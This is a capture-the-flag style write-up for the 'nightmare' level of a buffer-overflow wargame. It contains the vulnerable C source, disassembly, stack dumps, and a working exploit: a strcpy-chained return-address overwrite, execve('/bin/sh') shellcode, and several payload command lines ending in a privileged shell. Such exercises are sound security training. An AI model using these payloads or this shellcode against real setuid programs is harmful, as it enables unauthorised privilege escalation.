# Level 17, Succubus -> Nightmare

### nightmare.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - nightmare
        - PLT
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dumpcode.h>

main(int argc, char *argv[])
{
        char buffer[40];
        char *addr;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // check address
        addr = (char *)&strcpy;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with strcpy()\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // dangerous waterfall
        memset(buffer+40+8, 'A', 4);
}
```

### Analysis

#### Disassembling the "nightmare"

```
Dump of assembler code for function main:
0x80486b4 <main>:       push   %ebp
0x80486b5 <main+1>:     mov    %ebp,%esp
0x80486b7 <main+3>:     sub    %esp,44
0x80486ba <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x80486be <main+10>:    jg     0x80486d7 <main+35>
0x80486c0 <main+12>:    push   0x80487db
0x80486c5 <main+17>:    call   0x80483e0 <printf>
0x80486ca <main+22>:    add    %esp,4
0x80486cd <main+25>:    push   0
0x80486cf <main+27>:    call   0x80483f0 <exit>
0x80486d4 <main+32>:    add    %esp,4
0x80486d7 <main+35>:    mov    DWORD PTR [%ebp-44],0x8048410
0x80486de <main+42>:    push   4
0x80486e0 <main+44>:    lea    %eax,[%ebp-44]
0x80486e3 <main+47>:    push   %eax
0x80486e4 <main+48>:    mov    %eax,DWORD PTR [%ebp+12]
0x80486e7 <main+51>:    add    %eax,4
0x80486ea <main+54>:    mov    %edx,DWORD PTR [%eax]
0x80486ec <main+56>:    add    %edx,44
0x80486ef <main+59>:    push   %edx
0x80486f0 <main+60>:    call   0x80483c0 <memcmp>
0x80486f5 <main+65>:    add    %esp,12
0x80486f8 <main+68>:    mov    %eax,%eax
0x80486fa <main+70>:    test   %eax,%eax
0x80486fc <main+72>:    je     0x8048715 <main+97>
0x80486fe <main+74>:    push   0x8048800
0x8048703 <main+79>:    call   0x80483e0 <printf>
0x8048708 <main+84>:    add    %esp,4
0x804870b <main+87>:    push   0
0x804870d <main+89>:    call   0x80483f0 <exit>
0x8048712 <main+94>:    add    %esp,4
0x8048715 <main+97>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048718 <main+100>:   add    %eax,4
0x804871b <main+103>:   mov    %edx,DWORD PTR [%eax]
0x804871d <main+105>:   push   %edx
0x804871e <main+106>:   lea    %eax,[%ebp-40]
0x8048721 <main+109>:   push   %eax
0x8048722 <main+110>:   call   0x8048410 <strcpy>
0x8048727 <main+115>:   add    %esp,8
0x804872a <main+118>:   lea    %eax,[%ebp-40]
0x804872d <main+121>:   push   %eax
0x804872e <main+122>:   push   0x8048825
0x8048733 <main+127>:   call   0x80483e0 <printf>
0x8048738 <main+132>:   add    %esp,8
0x804873b <main+135>:   push   4
0x804873d <main+137>:   push   65
0x804873f <main+139>:   lea    %eax,[%ebp-40]
0x8048742 <main+142>:   lea    %edx,[%eax+48]
0x8048745 <main+145>:   push   %edx
0x8048746 <main+146>:   call   0x8048400 <memset>
0x804874b <main+151>:   add    %esp,12
0x804874e <main+154>:   leave
0x804874f <main+155>:   ret

Dump of assembler code for function strcpy:
0x400767b0 <strcpy>:    push   %ebp
0x400767b1 <strcpy+1>:  mov    %ebp,%esp
0x400767b3 <strcpy+3>:  push   %esi
0x400767b4 <strcpy+4>:  mov    %esi,DWORD PTR [%ebp+8]
0x400767b7 <strcpy+7>:  mov    %edx,DWORD PTR [%ebp+12]
0x400767ba <strcpy+10>: mov    %eax,%esi
0x400767bc <strcpy+12>: sub    %eax,%edx
0x400767be <strcpy+14>: lea    %ecx,[%eax-1]
0x400767c1 <strcpy+17>: mov    %al,BYTE PTR [%edx]
0x400767c3 <strcpy+19>: inc    %edx
0x400767c4 <strcpy+20>: mov    BYTE PTR [%ecx+%edx],%al
0x400767c7 <strcpy+23>: test   %al,%al
0x400767c9 <strcpy+25>: jne    0x400767c1 <strcpy+17>
0x400767cb <strcpy+27>: mov    %eax,%esi
0x400767cd <strcpy+29>: mov    %esi,DWORD PTR [%ebp-4]
0x400767d0 <strcpy+32>: leave
0x400767d1 <strcpy+33>: ret
End of assembler dump.
```

#### Estimated Stack Structure

```sh
|  char *addr           | [%ebp-44]
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]
|  RET                  | [%ebp+4]
|  ARGC                 | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+12]
```

#### Observed Stack Structure (bp at *main+154)

```
(gdb) run `python -c "print 'B'*44+'\x10\x84\x04\x08'"`
Starting program: /home/succubus/nightmare-cp `python -c "print 'B'*44+'\x10\x84\x04\x08'"`
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB▒

Breakpoint 2, 0x804874e in main ()
(gdb) x/100x $esp
0xbffffa9c:     0x08048410      0x42424242      0x42424242      0x42424242      -> addr, buffer[40]
0xbffffaac:     0x42424242      0x42424242      0x42424242      0x42424242      -> buffer[40]
0xbffffabc:     0x42424242      0x42424242      0x42424242      0x42424242      -> buffer[40], SFP
0xbffffacc:     0x08048410      0x41414141      0xbffffb14      0xbffffb20      -> RET
0xbffffadc:     0x40013868      0x00000002      0x08048420      0x00000000
0xbffffaec:     0x08048441      0x080486b4      0x00000002      0xbffffb14
0xbffffafc:     0x08048350      0x0804877c      0x4000ae60      0xbffffb0c
0xbffffb0c:     0x40013e90      0x00000002      0xbffffc14      0xbffffc30
0xbffffb1c:     0x00000000      0xbffffc61      0xbffffc74      0xbffffc8d
0xbffffb2c:     0xbffffcac      0xbffffcce      0xbffffcdc      0xbffffe9f
0xbffffb3c:     0xbffffebe      0xbffffedc      0xbffffef1      0xbfffff11
0xbffffb4c:     0xbfffff1c      0xbfffff2d      0xbfffff35      0xbfffff46
0xbffffb5c:     0xbfffff50      0xbfffff5e      0xbfffff6f      0xbfffff7d
0xbffffb6c:     0xbfffff88      0xbfffff9c      0x00000000      0x00000003
0xbffffb7c:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffb8c:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffb9c:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffbac:     0x08048420      0x0000000b      0x00000205      0x0000000c
0xbffffbbc:     0x00000205      0x0000000d      0x00000205      0x0000000e
0xbffffbcc:     0x00000205      0x00000010      0x0fabfbff      0x0000000f
0xbffffbdc:     0xbffffc0f      0x00000000      0x00000000      0x00000000
0xbffffbec:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbfc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc0c:     0x69000000      0x00363836      0x6d6f682f      0x75732f65
0xbffffc1c:     0x62756363      0x6e2f7375      0x74686769      0x6572616d

```

### Exploit

#### How to pwn

1. Find strcpy() address

```
(gdb) p strcpy
$1 = {char *(char *, char *)} 0x400767b0 <strcpy>
```

2. use strcpy to overwrite RET address


#### Payload structure
```
'/bin/sh'       (7 bytes)
+
DUMMY           (37 bytes)
+
&strcpy         (4 bytes)
+
T.DUMMY         (4 bytes)
+
T.DUMMY Address (4 bytes)
+
'/bin/sh' addr  (4 bytes)
+
NOP * 100       (100 bytes)
+
shellcode       (24 bytes)
```

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```sh
export nightmare=`python -c "print '\xec\xf9\xff\xbf'"`

./nightmare-cp "`python -c "print 'A'*44+'\x10\x84\x04\x08'+'A'*4+'\xe0\xf9\xff\xbf'+'\xa7\xfc\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`"

./nightmar "`python -c "print 'A'*44+'\x10\x84\x04\x08'+'A'*4+'\xe0\xf9\xff\xbf'+'\xab\xfc\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`"

./nightmare "`python -c "print 'A'*44+'\x10\x84\x04\x08'+'A'*4+'\xe0\xf9\xff\xbf'+'\xa9\xfc\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`"

./nightmare-cp "`python -c "print 'A'*44+'\x10\x84\x04\x08'+'A'*4+'\xe0\xf9\xff\xbf'+'\xa3\xfc\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`"

./nightmare-cpp "`python -c "print 'A'*44+'\x10\x84\x04\x08'+'A'*4+'\xe0\xf9\xff\xbf'+'\xa1\xfc\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`"

./nightmare-cppp "`python -c "print 'A'*44+'\x10\x84\x04\x08'+'A'*4+'\xe0\xf9\xff\xbf'+'\x9f\xfc\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`"
```



### Result

```
[succubus@localhost succubus]$ ./nightmare "`python -c "print 'A'*44+'\x10\x84\x04\x08'+'A'*4+'\xf0\xf9\xff\xbf'+'\xa9\xfc\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
                                   ̀
bash$ id
uid=517(succubus) gid=517(succubus) euid=518(nightmare) egid=518(nightmare) groups=517(succubus)
bash$ my-pass
euid = 518
beg for me
```